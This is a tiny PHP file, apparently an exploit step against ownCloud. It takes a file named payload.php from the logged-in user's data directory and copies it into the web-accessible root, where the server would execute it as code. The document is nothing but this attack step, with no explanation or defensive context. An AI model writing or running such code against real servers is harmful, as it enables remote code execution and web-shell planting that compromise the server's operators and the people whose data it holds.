<?php
copy("../data/".OCP\USER::getUser()."/payload.php","../payload.php");  
?>
